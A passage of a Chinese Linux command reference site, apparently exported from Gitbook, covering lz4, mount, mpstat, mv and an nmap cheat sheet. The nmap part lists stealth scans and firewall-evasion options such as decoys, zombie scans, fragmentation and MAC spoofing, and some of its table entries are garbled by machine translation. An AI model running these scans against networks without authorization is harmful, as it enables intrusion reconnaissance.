ls test test.lz4 压缩文件时，保留源文件 （-f 参数），默认压缩后就是保留源文件，所以-f参数加不加都可以 $ rm -f test.lz4 $ lz4 test Compressed filename will be : test.lz4 Compressed 8 bytes into 27 bytes ==> 337.50% $ ls test test.lz4 $ rm -f test.lz4 $ lz4 -f test Compressed filename will be : test.lz4 Compressed 8 bytes into 27 bytes ==> 337.50% $ ls test test.lz4 压缩成功后，将源文件删除 （--rm参数） $ rm -f test.lz4 $ ls test $ lz4 --rm test Compressed filename will be : test.lz4 Compressed 8 bytes into 27 bytes ==> 337.50% $ ls test.lz4 2）对压缩文件进行解压缩 默认通过-d参数进行解压缩 $ ls test.lz4 $ lz4 -d test.lz4 Decoding file test test.lz4 : decoded 8 bytes $ ls test test.lz4 $ cat test haha,hello world!! 也可以使用lz4_decompress命令进行解压缩，并且可以自定义解压缩之后的文件名 $ rm -f test $ ls test.lz4 $ lz4_decompress test.lz4 kevin #将test.lz4解压缩，解压缩之后为kevin文件 $ ls kevin test.lz4 $ cat kevin haha,hello world!! 3） 压缩时，取消告警提示信息 （-q参数） $ rm -f test.lz4 $ ls kevin $ lz4 -q kevin $ ls kevin kevin.lz4 $ lz4 -q -f kevin $ lz4 -q -f --rm kevin $ ls kevin.lz4 4）对多个文件进行匹配压缩 $ ls bobo kevin $ lz4 -m bobo kevin $ ls bobo bobo.lz4 kevin kevin.lz4 $ rm -rf bobo kevin $ ls bobo.lz4 kevin.lz4 $ lz4 -d bobo.lz4 -q $ lz4 -d kevin.lz4 -q $ ls bobo bobo.lz4 kevin kevin.lz4 更多阅读： 更多阅读： Linux Command lz4 压缩 Linux Command tar 压缩 Linux Command gzip 压缩 Linux Command zip 压缩 图 1.2.41.1：在这里插入图片描述 Copyright © ghostwritten 浙ICP备2020032454号 2022 all right reserved，powered by Gitbook该文件修订时间： 2022-06-14 05:45:46 "},"Linux-Command/Linux_Command_mount.html":{"url":"Linux-Command/Linux_Command_mount.html","title":"Linux Command Mount","keywords":"","body":"Linux Command mount 挂载1. 简介2. 语法3. 退出状态4. 命令选项5. mount 挂载5.1 列出挂载的文件系统5.2 列出特定文件系统5.3 挂载文件系统5.4 使用 /etc/fstab 挂载文件系统5.5 挂载 USB 驱动器5.6 安装 CD-ROM5.7 挂载 ISO 文件5.8 挂载 NFS5.9 非超级用户安装5.10 移动挂载点6. umount 卸载6.1 懒惰（lazy）卸载6.2 强制卸载Linux Command mount 挂载 tagsstart 文件管理 tagsstop 图 1.2.42.1：在这里插入图片描述 1. 简介 Linux 文件系统层次结构呈树状排列，文件系统从根目录 ( /) 开始。所有其他子文件系统都从根目录分支出来。 mount命令允许用户挂载，即将额外的子文件系统附加到当前可访问文件系统上的特定挂载点。该命令将挂载指令传递给内核，内核完成操作。 2. 语法 mount -t [type] [device] [dir] 该命令指示内核附加在目录中找到的文件[device]系统[dir]。该-t [type]选项是可选的，它描述了文件系统类型（EXT3、EXT4、BTRFS、XFS、HPFS、VFAT 等）。 如果省略了目标目录，它将挂载/etc/fstab文件中列出的文件系统。 挂载文件系统时，目录之前的内容、所有者和模式[dir]是不可见的，[dir]路径名是指文件系统根目录。 3. 退出状态 该mount命令返回指示进程完成状态的以下值之一： 成功。 命令调用不正确或权限不足。 系统错误。 内部安装错误。 操作被用户中断。 写入或锁定/etc/mtab文件的问题。 挂载失败。 至少一个挂载操作成功了，但不是全部。 4. 命令选项 命令选项进一步指定文件系统类型、mount安装位置和类型。下表显示了最常见的mount选项： |选项| 描述| |--|--| |-a |挂载/etc/fstab中列出的所有文件系统。| |-F |mount为每个设备创建一个新的化身。必须与-a选项结合使用。| |-h |显示带有所有命令选项的帮助文件。| |-l |列出所有已挂载的文件系统并为每个设备添加标签。| |-L [label] | 挂载指定的分区[label]。| |-M |将子树移动到另一个位置。| |-r|以只读模式挂载文件系统。| |-R |在不同的位置重新挂载子树，使其内容在两个位置都可用。| |-t [type] |指示文件系统类型。| |-T| 用于指定替代的/etc/fstab文件。| |-v| 详细安装，描述每个操作。| |-V| 显示程序版本信息。| -O [opts] 与 结合使用-a，限制-a适用的文件系统集。指在/etc/fstab文件[opts]的选项字段中指定的选项。该命令接受以逗号分隔的列表（不带空格）中指定的多个选项。 |选项| 描述| |--|--| |-o async：|打开非同步模式，所有的档案读写动作都会用非同步模式执行。 |-o sync：|在同步模式下执行。 |-o atime、-o noatime：|当 atime 打开时，系统会在每次读取档案时更新档案的『上一次调用时间』。当我们使用 flash 档案系统时可能会选项把这个选项关闭以减少写入的次数。 |-o auto、-o noauto：|打开/关闭自动挂上模式。 |-o defaults: |使用预设的选项 rw, suid, dev, exec, auto, nouser, and async. |-o dev、-o nodev-o exec、-o noexec |允许执行档被执行。 |-o suid、-o nosuid：|允许执行档在 root 权限下执行。 |-o user、-o nouser：|使用者可以执行 mount/umount 的动作。 |-o remount：|将一个已经挂下的档案系统重新用不同的方式挂上。例如原先是唯读的系统，现在用可读写的模式重新挂上。 |-o ro：|用唯读模式挂上。 |-o rw：|用可读写模式挂上。 |-o loop=：|使用 loop 模式用来将一个档案当成硬盘分割挂上系统。 5. mount 挂载 5.1 列出挂载的文件系统 图 1.2.42.2：在这里插入图片描述 5.2 列出特定文件系统 该-t选项允许用户指定运行mount命令时要显示的文件系统。例如，要仅显示 ext4 文件系统，请运行以下命令： mount -t ext4 图 1.2.42.3：在这里插入图片描述 5.3 挂载文件系统 挂载文件系统需要用户指定文件系统将附加到的目录或挂载点。例如，要将/dev/sdb1文件系统挂载到/mnt/media目录，请运行： sudo mount /dev/sdb1 /mnt/media 要指定其他特定于文件系统的挂载选项，请-o在设备名称之前传递标志，后跟选项。使用以下语法： mount -o [options] [device] [dir] 5.4 使用 /etc/fstab 挂载文件系统 /etc/fstab文件包含描述系统设备的安装位置和它们使用的选项的行。通常，fstab用于内部设备，例如 CD/DVD 设备和网络共享 (samba/nfs/sshfs)。可移动设备通常由gnome-volume-manager. 仅提供一个参数（或[dir]或[device]）会导致mount读取/etc/fstab配置文件的内容以检查指定的文件系统是否在其中列出。如果列出了给定的文件系统，则mount使用缺失参数的值和/etc/fstab文件中指定的挂载选项。 /etc/fstab中定义的结构是： 以下屏幕截图显示了/etc/fstab文件的内容： 要挂载/etc/fstab文件中指定的文件系统，请使用以下语法之一： mount [options] [dir] mount [options] [device] 对于[dir]，指定安装点。 对于[device]，指定设备标识符。 5.5 挂载 USB 驱动器 现代 Linux 发行版在插入后会自动挂载可移动驱动器。但是，如果自动挂载失败，请按照以下步骤手动挂载 U 盘： 使用mkdir 命令创建挂载点： mkdir /media/usb-drive 找到 USB 设备和文件系统类型。跑： fdisk -l 使用fdisk输出中的设备标识符，使用以下语法挂载 USB 驱动器： sudo mount [identifier] /media/usb-drive 例如，如果设备列为/dev/sdb1，请运行： sudo mount /dev/sdb1 /media/usb-drive 要查找设备和文件系统类型，您可以使用以下任何命令： fdisk -l ls -l /dev/disk/by-id/usb* dmesg lsblk 5.6 安装 CD-ROM 作为可移动设备，Linux 也会自动安装 CD-ROM。但是，如果挂载失败，请运行以下命令手动挂载 CD-ROM： mount -t iso9660 -o ro /dev/cdrom /mnt 确保/mnt安装点存在以使命令正常工作。如果没有，请使用mkdir命令创建一个。 iso9660是 CD-ROM 的标准文件系统，而-o ro选项导致mount将其视为只读文件系统。 5.7 挂载 ISO 文件 挂载 ISO 文件需要将其数据映射到循环设备。-o loop通过传递选项，使用循环设备将 ISO 文件附加到安装点： mkdir /media/iso-file mount /path/to/image.iso /media/iso-file -o loop /path/to/image.iso为您的 ISO 文件的路径 5.8 挂载 NFS 网络文件系统 (NFS) 是一种分布式文件系统协议，用于通过网络共享远程目录。挂载 NFS 允许您使用远程文件，就好像它们存储在本地一样。 安装 NFS 需要安装 NFS 客户端软件包。了解如何在 Ubuntu 上安装 NFS 服务器。 在 Ubuntu 和 Debian 上安装 NFS 客户端： sudo apt install nfs-common 在 CentOS 和 Fedora 上安装 NFS 客户端： sudo yum install nfs-utils 按照以下步骤在系统上挂载远程 NFS 目录： mkdir1. 使用命令创建挂载点： sudo mkdir /media/nfs 通过运行挂载 NFS 共享： sudo mount /media/nfs 要在启动时自动挂载远程 NFS 共享，请使用您选择的文本编辑器编辑/etc/fstab文件： sudo vi /etc/fstab 将以下行添加到文件并替换remote.server:/dir为 NFS 服务器 IP 地址或主机名以及导出的目录： remote.server:/dir /media/nfs nfs defaults 0 0 运行以下命令挂载 NFS 共享： sudo mount /media/nfs 延展：查看如何创建和使用 NFS Docker 卷。 5.9 非超级用户安装 虽然只有超级用户可以挂载文件系统，但包含该选项的/etc/fstabuser文件中的文件系统可以由任何系统用户挂载。 使用文本编辑器编辑/etc/fstab文件并在字段下指定user选项。例如： /dev/cdrom /cd iso9660 ro,user,noauto,unhide 将上面的行添加到/etc/fstab允许任何系统用户iso9660从 CD-ROM 设备挂载文件系统。 指定users选项而不是user允许任何用户卸载文件系统，而不仅仅是安装它的用户。 5.10 移动挂载点 如果您决定将已安装的文件系统移动到另一个安装点，请使用该-M选项。语法是： mount --move [olddir] [newdir] 对于[olddir]，指定当前安装点。对于[newdir]，指定要将文件系统移动到的挂载点。 将挂载的文件系统移动到另一个挂载点会导致其内容出现在[newdir]目录中，但不会更改文件的物理位置。 6. umount 卸载 如何卸载文件系统 语法 umount [dir] 或者 umount [device] 例如，要分离列为 的 USB 设备/dev/sdb1，请运行： umount /dev/sdb1 在忙于打开文件或正在进行的进程时，无法分离文件系统，并且进程失败。如果您不确定文件系统在使用什么，请运行fuser 命令以找出： fuser -m [dir] 对于[dir]，指定文件系统安装点。例如： fuser -m /media/usb-drive 输出列出了当前访问设备的进程的 PID。停止进程并卸载文件系统。 注意：了解如何列出 Linux 中正在运行的进程。 6.1 懒惰（lazy）卸载 如果您不想手动停止进程，请使用延迟卸载，它指示unmount命令在其活动停止后立即分离文件系统。语法是： umount --lazy [device] 6.2 强制卸载 ( -f)--force选项允许用户强制卸载。但是，在强制卸载文件系统时要小心，因为该过程可能会损坏其上的数据。 语法是：umount -f [dir] 参考： How to Mount and Unmount File Systems in Linux Linux mount Command with Examples mount(8) — Linux manual page Copyright © ghostwritten 浙ICP备2020032454号 2022 all right reserved，powered by Gitbook该文件修订时间： 2022-10-16 08:56:43 "},"Linux-Command/Linux_Command_mpstat.html":{"url":"Linux-Command/Linux_Command_mpstat.html","title":"Linux Command Mpstat","keywords":"","body":"linux Command mpstat 实时系统监控工具1. 简介2. 语法3. 参数4. 示例5. vmstat和mpstat对比linux Command mpstat 实时系统监控工具 tagsstart 分析 监控 tagsstop 1. 简介 mpstat是 Multiprocessor Statistics的缩写，是实时系统监控工具。其报告与CPU的一些统计信息，这些信息存放在/proc/stat文件中。在多CPU系统里，其不但能查看所有CPU的平均状况信息，而且能够查看特定CPU的信息。 2. 语法 mpstat的语法如下 mpstat [-P {cpu|ALL}] [internal [count]] 1 其中，各参数含义如下： 参数 含义 -P {cpu l ALL} 表示监控哪个CPU， cpu在[0,cpu个数-1]中取值 internal 相邻的两次采样的间隔时间 count 采样的次数，count只能和delay一起使用 3. 参数 当没有参数时，mpstat则显示系统启动以后所有信息的平均值。有interval时，第一行的信息自系统启动以来的平均信息。从第二行开始，输出为前一个interval时间段的平均信息。 输出各参数含义： 参数 释义 从/proc/stat获得数据 CPU 处理器ID %usr 在internal时间段里，用户态的CPU时间（%），不包含 nice值为负进程 usr/total*100 %nice 在internal时间段里，nice值为负进程的CPU时间（%） nice/total*100 %sys 在internal时间段里，核心时间（%） system/total*100 %iowait 在internal时间段里，硬盘IO等待时间（%） iowait/total*100 %irq 在internal时间段里，硬中断时间（%） irq/total*100 %soft 在internal时间段里，软中断时间（%） softirq/total*100 %steal 显示虚拟机管理器在服务另一个虚拟处理器时虚拟CPU处在非自愿等待下花费时间的百分比 steal/total*100 %guest 显示运行虚拟处理器时CPU花费时间的百分比 guest/total*100 %gnice gnice/total*100 %idle 在internal时间段里，CPU除去等待磁盘IO操作外的因为任何原因而空闲的时间闲置时间（%） idle/total*100 CPU总的工作时间： total_cur = user + system + nice + idle + iowait + irq + softirq total_pre = pre_user + pre_system + pre_nice + pre_idle + pre_iowait + pre_irq + pre_softirq user = user_cur – user_pre total = total_cur - total_pre 其中_cur 表示当前值，_pre表示interval时间前的值。上表中的所有值可取到两位小数点。 4. 示例 [root@master ~]# mpstat Linux 3.10.0-957.1.3.el7.x86_64 (master) 2021年06月08日 _x86_64_ (2 CPU) 16时50分15秒 CPU %usr %nice %sys %iowait %irq %soft %steal %guest %gnice %idle 16时50分15秒 all 3.75 0.05 4.91 0.03 0.00 0.48 0.00 0.00 0.00 90.79 [root@master ~]# mpstat -P ALL 5 2 Linux 3.10.0-957.1.3.el7.x86_64 (master) 2021年06月08日 _x86_64_ (2 CPU) 16时50分47秒 CPU %usr %nice %sys %iowait %irq %soft %steal %guest %gnice %idle 16时50分52秒 all 2.80 0.00 2.59 0.00 0.00 0.21 0.00 0.00 0.00 94.40 16时50分52秒 0 3.10 0.00 2.69 0.00 0.00 0.41 0.00 0.00 0.00 93.80 16时50分52秒 1 2.49 0.00 2.49 0.00 0.00 0.00 0.00 0.00 0.00 95.01 16时50分52秒 CPU %usr %nice %sys %iowait %irq %soft %steal %guest %gnice %idle 16时50分57秒 all 3.42 0.00 5.49 0.00 0.00 0.41 0.00 0.00 0.00 90.67 16时50分57秒 0 3.53 0.00 6.02 0.00 0.00 0.21 0.00 0.00 0.00 90.25 16时50分57秒 1 3.33 0.00 4.99 0.00 0.00 0.42 0.00 0.00 0.00 91.27 平均时间: CPU %usr %nice %sys %iowait %irq %soft %steal %guest %gnice %idle 平均时间: all 3.11 0.00 4.04 0.00 0.00 0.31 0.00 0.00 0.00 92.53 平均时间: 0 3.31 0.00 4.35 0.00 0.00 0.31 0.00 0.00 0.00 92.03 平均时间: 1 2.91 0.00 3.74 0.00 0.00 0.21 0.00 0.00 0.00 93.14 表示每5秒产生一个报告，总共产生2个。 上图表示每5秒产生了2个关于处理器的统计数据报告，一共产生2个interval 的信息，然后再给出这2个interval的平均信息。默认时，输出是按照CPU 号排序。第一个行给出了从系统引导以来的所有活跃数据。接下来每行对应一个处理器的活跃状态。 5. vmstat和mpstat对比 1.vmstat和mpstat 命令的差别：mpstat 可以显示每个处理器的统计，而 vmstat 显示所有处理器的统计。因此，编写糟糕的应用程序（不使用多线程体系结构）可能会运行在一个多处理器机器上，而不使用所有处理器。从而导致一个 CPU 过载，而其他 CPU 却很空闲。通过 mpstat 可以轻松诊断这些类型的问题。 2.vmstat中所有关于CPU的总结都适合mpstat。当您看到较低的 %idle 数字时，您知道出现了 CPU 不足的问题。当您看到较高的 %iowait 数字时，您知道在当前负载下 I/O 子系统出现了某些问题。 参考： mpstat(1) — Linux manual page mpstat(1) - Linux man page mpstat Command in Linux with Examples mpstat Command Examples in Linux Copyright © ghostwritten 浙ICP备2020032454号 2022 all right reserved，powered by Gitbook该文件修订时间： 2022-06-23 05:33:04 "},"Linux-Command/Linux_Command_mv.html":{"url":"Linux-Command/Linux_Command_mv.html","title":"Linux Command Mv","keywords":"","body":"Linux Command mv 文件移动1. 移动文件2. 移动多个文件3. 移动目录4. 重命名文件或目录5. 打印移动信息6. 使用交互模式7. 使用更新选项8. 不要覆盖任何已存在的文件9. 复制时创建备份Linux Command mv 文件移动 tagsstart 文件管理 tagsstop 图 1.2.44.1：在这里插入图片描述 1. 移动文件 $ ls dir1 file1 $ mv file1 dir1/ $ ls dir1 $ ls dir1/ file1 2. 移动多个文件 第一种： $ ls dir1 file1 file2 $ mv file1 file2 dir1/ $ ls dir1 $ ls dir1/ file1 file2 第二种 $ ls dir1 file1 file2 $ mv file* dir1/ $ ls dir1 $ ls dir1/ file1 file2 3. 移动目录 $ ls dir1 $ mkdir dir2 $ ls dir1 dir2 $ mv dir1 dir2 $ ls dir2 $ ls dir2/ dir1 4. 重命名文件或目录 $ ls dir2 file1 $ mv file1 file2 $ mv dir2 dir1 $ ls dir1 file2 5. 打印移动信息 当你移动或重命名一大堆文件或目录时，你可能会想在不去目标位置去查看的情况下知道你自己的命令是否成功地执行了。这就要用到-v选项了 $ ls dir1 file1 file2 file3 file4 $ mv -v file* dir1/ \"file1\" -> \"dir1/file1\" \"file2\" -> \"dir1/file2\" \"file3\" -> \"dir1/file3\" \"file4\" -> \"dir1/file4\" $ ls dir1 subdir1 subdir2 subdir3 subdir4 $ mv -v subdir* dir1/ \"subdir1\" -> \"dir1/subdir1\" \"subdir2\" -> \"dir1/subdir2\" \"subdir3\" -> \"dir1/subdir3\" \"subdir4\" -> \"dir1/subdir4\" 6. 使用交互模式 当你将文件移动到其它位置，而那个位置恰好有同样的文件，这时 mv 命令会覆盖掉原来的文件。对于mv的这一行为一般不会有什么提示。如果想产生一个关于覆盖文件的提示，我们可以使用-i选项。（译注：通常发行版会通过alias命令，将-i作为默认选项，所以会有提示。） $ cat /root/.bashrc # .bashrc # User specific aliases and functions alias rm='rm -i' alias cp='cp -i' alias mv='mv -i' $ ls dir1 file1 $ ls dir1/ file1 $ mv -i file1 dir1/ mv：是否覆盖\"dir1/file1\"？ y $ ls dir1 $ ls dir1/ file1 7. 使用更新选项 －u 则只在源文件比目标文件新时才执行更新。默认也会询问是否覆盖。 -f 为强制覆盖 $ ll 总用量 0 drwxr-xr-x 2 root root 58 6月 9 15:29 dir1 -rw-r--r-- 1 root root 0 6月 9 15:29 file1 -rw-r--r-- 1 root root 0 6月 9 15:29 file2 -rw-r--r-- 1 root root 0 6月 9 15:29 file3 -rw-r--r-- 1 root root 0 6月 9 15:29 file4 $ ll dir1/ 总用量 4 -rw-r--r-- 1 root root 4 6月 9 15:29 file1 -rw-r--r-- 1 root root 0 6月 9 15:29 file2 -rw-r--r-- 1 root root 0 6月 9 15:29 file3 -rw-r--r-- 1 root root 0 6月 9 15:29 file4 $ mv -uv file* dir1/ mv：是否覆盖\"dir1/file1\"？ y \"file1\" -> \"dir1/file1\" 或者 $ mv -uvf file* dir1/ \"file1\" -> \"dir1/file1\" 8. 不要覆盖任何已存在的文件 -i 选项询问我们是否要覆盖文件 -n 选项将不会允许我们覆盖任何已存在的文件 $ ls dir1 file1 file2 file3 file4 $ ls dir1/ file2 file3 file4 $ mv -nv file* dir1/ \"file1\" -> \"dir1/file1\" 9. 复制时创建备份 -b选项。该选项会在新文件覆盖旧文件时将旧文件做备份 $ ll 总用量 8 drwxr-xr-x 2 root root 58 6月 9 15:37 dir1 -rw-r--r-- 1 root root 5 6月 9 15:38 file1 -rw-r--r-- 1 root root 5 6月 9 15:38 file2 -rw-r--r-- 1 root root 0 6月 9 15:29 file3 -rw-r--r-- 1 root root 0 6月 9 15:29 file4 $ ll dir1/ 总用量 4 -rw-r--r-- 1 root root 5 6月 9 15:30 file1 -rw-r--r-- 1 root root 0 6月 9 15:29 file2 -rw-r--r-- 1 root root 0 6月 9 15:29 file3 -rw-r--r-- 1 root root 0 6月 9 15:29 file4 $ mv -bvf file* dir1/ \"file1\" -> \"dir1/file1\" (备份：\"dir1/file1~\") \"file2\" -> \"dir1/file2\" (备份：\"dir1/file2~\") \"file3\" -> \"dir1/file3\" (备份：\"dir1/file3~\") \"file4\" -> \"dir1/file4\" (备份：\"dir1/file4~\") $ ls dir1/ file1 file1~ file2 file2~ file3 file3~ file4 file4~ or如何没有更新的文件不想被覆盖与备份则： $ mv -ubvf file* dir1/ \"file1\" -> \"dir1/file1\" (备份：\"dir1/file1~\") \"file2\" -> \"dir1/file2\" (备份：\"dir1/file2~\") Copyright © ghostwritten 浙ICP备2020032454号 2022 all right reserved，powered by Gitbook该文件修订时间： 2022-06-14 05:47:41 "},"Linux-Command/Linux_Command_namp.html":{"url":"Linux-Command/Linux_Command_namp.html","title":"Linux Command Namp","keywords":"","body":"Linux Command nmap 网络扫描简介原理端口状态选项基本扫描发现扫描禁用DNS名称解析无ping扫描端口扫描版本检测防火墙规避技术故障排除和调试NMAP 脚本Linux Command nmap 网络扫描 tagsstart 网络 tagsstop 图 1.2.45.1：在这里插入图片描述 简介 Nmap（“ Network Mapper ”）是一个用于网络探索和安全审计的开源工具。它旨在快速扫描大型网络，尽管它对单个主机运行良好。Nmap 以新颖的方式使用原始 IP 数据包来确定网络上可用的主机、这些主机提供的服务（应用程序名称和版本）、它们运行的​​操作系统（和操作系统版本）、数据包过滤器/防火墙的类型正在使用中，以及其他数十种特性。虽然 Nmap 通常用于安全审计，但许多系统和网络管理员发现它对日常任务非常有用，例如网络清单、管理服务升级计划以及监控主机或服务正常运行时间。 Nmap 的输出是扫描目标的列表，每个目标的补充信息取决于使用的选项。该信息中的关键是“有趣的端口表”。 该表列出了端口号和协议、服务名称和状态。状态为 open、filtered、 closed或unfiltered。 Open 表示目标机器上的应用程序正在侦听该端口上的连接/数据包。 Filtered 表示防火墙、过滤器或其他网络障碍正在阻塞端口，因此 Nmap 无法判断它是 open还是closed。 Closed 端口没有应用程序监听它们，尽管它们可以随时打开。端口分类为 unfiltered 当它们响应 Nmap 的探针时，但 Nmap 无法确定它们是打开还是关闭。Nmap 报告状态组合 open|filtered 和closed|filtered 当它无法确定两种状态中的哪一种描述一个端口时。当请求版本检测时，端口表还可以包括软件版本详细信息。当请求 IP 协议扫描 ( -sO) 时，Nmap 提供有关支持的 IP 协议而不是侦听端口的信息。 除了有趣的端口表之外，Nmap 还可以提供有关目标的更多信息，包括反向 DNS 名称、操作系统猜测、设备类型和 MAC 地址。 基本功能有三个： 是扫描主机端口，嗅探所提供的网络服务 探测一组主机是否在线 推断主机所用的操作系统，到达主机经过的路由，系统已开放端口的软件版本 原理 端口状态 然许多端口扫描器传统上将所有端口归为打开或关闭状态，但 Nmap 更加精细。它将端口分为六种状态：open、 closed、filtered、 unfiltered、 open|filtered、 或 closed|filtered。 这些状态不是端口本身的固有属性，而是描述了 Nmap 如何看待它们。例如，来自与目标相同的网络的 Nmap 扫描可能会将端口显示135/tcp为打开，而同时使用来自 Internet 的相同选项的扫描可能会将该端口显示为filtered. open ： 应用程序在该端口接收 TCP 连接或者 UDP 报文。 closed ：关闭的端口对于nmap也是可访问的， 它接收nmap探测报文并作出响应。但没有应用程序在其上监听。 filtered ：由于包过滤阻止探测报文到达端口，nmap无法确定该端口是否开放。过滤可能来自专业的防火墙设备，路由规则或者主机上的软件防火墙。 unfiltered ：未被过滤状态意味着端口可访问，但是nmap无法确定它是开放还是关闭。 只有用于映射防火墙规则集的 ACK扫描才会把端口分类到这个状态。 open | filtered ：无法确定端口是开放还是被过滤，开放的端口不响应就是一个例子。没有响应也可能意味着报文过滤器丢弃了探测报文或者它引发的任何反应。UDP，IP协议,FIN, Null等扫描会引起。 closed|filtered：（关闭或者被过滤的）：无法确定端口是关闭的还是被过滤的。 选项 基本扫描 Goal Command Example Scan a Single Target nmap [target] nmap 192.168.0.1 Scan Multiple Targets nmap [target1, target2, etc nmap 192.168.0.1 192.168.0.2 Scan a Range of Hosts nmap [range of ip addresses] nmap 192.168.0.1-10 Scan an Entire Subnet nmap [ip address/cdir] nmap 192.168.0.1/24 Scan Random Hosts nmap -iR [number] nmap -iR 0 Excluding Targets from a Scan nmap [targets] – exclude [targets] nmap 192.168.0.1/24 –exclude 192.168.0.100, 192.168.0.200 Excluding Targets Using a List nmap [targets] – excludefile [list.txt] nmap 192.168.0.1/24 –excludefile notargets.txt 全面扫描 nmap -A [target] nmap -A 192.168.0.1 Scan an IPv6 Target nmap -6 [target] nmap -6 1aff:3c21:47b1:0000:0000:0000:0000:2afe nmap -A 192.168.0.12 扫描结果：目标主机MAC地址、设备类型、操作系统、中央处理单元、主机详细资料、网络距离等 发现扫描 | Goal | Command | Example | |--------------------------|-------------------|----------------------| | 执行仅 Ping 扫描 | nmap -sP [target] | nmap -sP 192.168.0.1 | | Don’t Ping | nmap -PN [target] | nmap -PN 192.168.0.1 | | TCP SYN Ping | nmap -PS [target] | nmap -PS 192.168.0.1 | | TCP ACK Ping | nmap -PA [target] | nmap -PA 192.168.0.1 | | UDP Ping | nmap -PU [target] | nmap -PU 192.168.0.1 | | SCTP INIT Ping | nmap -PY [target] | nmap -PY 192.168.0.1 | | ICMP Echo Ping | nmap -PE [target] | nmap -PE 192.168.0.1 | | ICMP Timestamp Ping | nmap -PP [target] | nmap -PP 192.168.0.1 | | CMP Address Mask Ping | nmap -PM [target] | nmap -PM 192.168.0.1 | | IP Protocol Ping | nmap -PO [target] | nmap -PO 192.168.0.1 | ARP Ping nmap -PR [target] nmap -PR 192.168.0.1 Traceroute（跟踪路由） nmap –traceroute [target] nmap –traceroute 192.168.0.1 Force Reverse DNS Resolution（强制反向 DNS 解析） nmap -R [target] nmap -R 192.168.0.1 Disable Reverse DNS Resolution（禁用反向 DNS 解析） nmap -n [target] nmap -n 192.168.0.1 Alternative DNS Lookup（替代 DNS 查找） nmap –system-dns [target] nmap –system-dns 192.168.0.1 Manually Specify DNS Server(s)（手动指定 DNS 服务器） nmap –dns-servers [servers] [target] nmap –dns-servers 201.56.212.54 192.168.0.1 Create a Host List （创建主机列表） nmap -sL [targets] nmap -sL 192.168.0.1/24 Goal Command Example TCP SYN Scan nmap -sS [target] nmap -sS 192.168.0.1 TCP Connect Scan nmap -sT [target] nmap -sT 192.168.0.1 UDP Scan nmap -sU [target] nmap -sU 192.168.0.1 TCP NULL Scan nmap -sN [target] nmap -sN 192.168.0.1 TCP FIN Scan nmap -sF [target] nmap -sF 192.168.0.1 Xmas Scan nmap -sX [target] nmap -sX 192.168.0.1 TCP ACK Scan nmap -sA [target] nmap -sA 192.168.0.1 Custom TCP Scan nmap –scanflags [flags] [target] nmap –scanflags SYNFIN 192.168.0.1 IP Protocol Scan nmap -sO [target] nmap -sO 192.168.0.1 Send Raw Ethernet Packets（发送原始以太网数据包） nmap –send-eth [target] nmap –send-eth 192.168.0.1 Send IP Packets nmap –send-ip [target] nmap –send-ip 192.168.0.1 禁用DNS名称解析 最后，您可以通过使用 -n 参数禁用反向 DNS 解析来加速 Nmap 扫描。如果您想扫描大型网络，这将非常有用。例如，要关闭上面提到的基本 ping 扫描的 DNS 解析，添加 -n： nmap -sp -n 192.100.1.1/24 无ping扫描 通常用于防火墙禁止ping的情况下，它能确定正在运行的机器。 默认情况下，nmap只对正在运行的主机进行高强度的探测，如端口扫描，版本探测或者操作系统探测。 用-P0禁止主机发现会使nmap对每一个特定的目标IP地址进行所要求的扫描，这可以穿透防火墙，也可以避免被防火墙发现。 nmap -P0 192.168.0.12 端口扫描 目标 命令 例子 执行快速扫描 nmap -F [目标] nmap -F 192.168.0.1 扫描特定端口 nmap -p [端口] [目标] nmap -p 21-25,80,139,8080 192.168.1.1 按名称扫描端口 nmap -p [端口名称] [目标] nmap -p ftp,http* 192.168.0.1 按协议扫描端口 nmap -sU -sT -p U: [端口],T:[端口] [目标] nmap -sU -sT -p U:53,111,137,T:21- 25,80,139,8080 192.168.0.1 扫描所有端口 nmap -p '*' [目标] nmap -p '*' 192.168.0.1 扫描顶部端口 nmap –top-ports [数字] [目标] nmap –top-ports 10 192.168.0.1 执行顺序端口扫描 nmap -r [目标] nmap -r 192.168.0.1 版本检测 目标 命令 例子 操作系统检测 nmap -O [目标] nmap -O 192.168.0.1 提交 TCP/IP 指纹 www.nmap.org/submit/ 指纹 尝试猜测未知操作系统 nmap -O –osscan 猜测 [目标] nmap -O –osscan-guess 192.168.0.1 服务版本检测 nmap -sV [目标] nmap -sV 192.168.0.1 版本扫描故障排除 nmap -sV –版本跟踪 [目标] nmap -sV –version-trace 192.168.0.1 执行 RPC 扫描 nmap -sR [目标] nmap -sR 192.168.0.1 防火墙规避技术 目标 命令 例子 增加数据包 nmap -f [目标] nmap -f 192.168.0.1 安抚特定的 MTU nmap –mtu [MTU] [目标] nmap –mtu 32 192.168.0。 使用诱饵 nmap -D RND:[数字] [目标] nmap -D RND:10 192.168.0.1 僵尸扫描 nmap -sI [僵尸] [目标] nmap -sI 192.168.0.38 手动指定源端口 nmap –source-port [端口] [目标] nmap –source-port 10 192.168.0.1 附加随机数据 nmap –data-length [大小] [目标] nmap –data-length 2 192.168.0.1 随机化目标扫描顺序 nmap –randomize-hosts [目标] nmap --randomize-ho 192.168.0.1-20 欺骗 MAC 地址 nmap –spoof-mac [MAC\\ 0\\ vendor] [目标] nmap –spoof-mac Cis 192.168.0.1 发送错误校验和 nmap –badsum [目标] nmap –badsum 192.168.0.1 故障排除和调试 目标 命令 例子 获得帮助 nmap -h nmap -h 显示 Nmap 版本 nmap -V nmap -V 详细输出 nmap -v [目标] nmap -v 192.168.0.1 调试 nmap -d [目标] nmap -d 192.168.0.1 显示端口状态原因 nmap –reason [目标] nmap –reason 192.168.0.1 仅显示打开的端口 nmap –open [目标] nmap –open 192.168.0.1 跟踪数据包 nmap –packet-trace [目标] nmap –packet-trace 192.168.0.1 显示主机网络 nmap –iflist nmap –iflist 指定网络接口 nmap -e [接口] [目标] nmap -e eth0 192.168.0.1 NMAP 脚本 目标 命令 例子 执行单个脚本 nmap –script [script.nse] [目标] nmap –script banner.nse 192.168.0.1 执行多个脚本 nmap –script [表达式] [目标] nmap –script 'http-*' 192.168.0.1 脚本类别 所有, 身份验证, 默认, 发现, 外部, 侵入性, 恶意软件, 安全, vuln 按类别执行脚本 nmap –script [类别] [目标] nmap –script ‘not intrusive’ 192.168.0.1 执行多个脚本类别 nmap – 脚本 [category1,category2,etc] nmap –script ‘default or safe’ 192.168.0.1 脚本疑难解答 nmap –script [脚本] –脚本跟踪 [目标] nmap –script banner.nse –script-trace 192.168.0.1 更新脚本数据库 nmap –脚本更新数据库 nmap –script-updatedb 参考： Nmap命令详解 NMAP Cheat Sheet nmap命令-----基础用法 nmap 官方 How to use Nmap to scan for open ports 官网 kali How to Use Nmap: Commands and Tutorial Guide 8 